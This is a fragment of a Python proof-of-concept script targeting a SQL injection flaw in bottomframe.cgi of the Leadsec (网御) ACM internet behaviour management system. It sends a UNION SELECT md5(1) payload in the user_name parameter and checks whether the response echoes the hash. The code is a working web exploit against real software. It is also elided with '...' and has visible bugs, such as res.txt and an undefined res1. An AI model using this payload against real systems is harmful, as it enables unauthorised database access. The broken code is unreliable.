...
╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
                                     info:网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞
	"""
	print(banner)
def poc(target):
	payload_url = "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23"
	...
	try:
		...
		if res.status_code == 200:
			if res1.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res1.txt:
